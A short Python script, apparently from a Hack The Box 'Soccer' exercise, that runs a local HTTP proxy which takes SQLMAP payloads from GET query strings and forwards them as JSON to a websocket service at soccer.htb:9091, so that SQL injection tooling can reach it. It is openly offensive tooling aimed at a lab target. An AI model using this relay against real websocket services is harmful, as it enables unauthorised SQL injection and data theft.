import rich, json
from http.server import BaseHTTPRequestHandler,HTTPServer
import urllib.parse
from websocket import create_connection

class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Get rid of the favicon request
        if self.path == '/favicon.ico':
            self.send_response(200)
            self.send_header('Content-Type', 'image/x-icon')
            self.send_header('Content-Length', 0)
            self.end_headers()
            return

        # parse SQLMAP payload
        try:
            payload = urllib.parse.urlparse(self.path)
            payload = payload.query[2:]
            payload = urllib.parse.unquote(payload)
        except:
            pass

        response = self.send_payload(payload)
        self.send_response(200)
        self.end_headers()
        # Write the output on the webpage
        self.wfile.write(str.encode(response))
        return

    # Send the payload to the websocket server
    def send_payload(self, payload):
        ws = create_connection("ws://soccer.htb:9091/")
        data = {"id": f"{payload}"}
        ws.send(json.dumps(data))
        response = ws.recv()
        ws.close()

        rich.print(f"Proxying: {data}")
        return response
    
    def log_message(self, format, *args):
        return
    
if __name__ == '__main__':
    rich.print("\n =========== STARTING PROXY ===========")
    server = HTTPServer(('localhost', 8080), GetHandler)
    rich.print('\nStarting server at http://localhost:8080\n')
    server.serve_forever()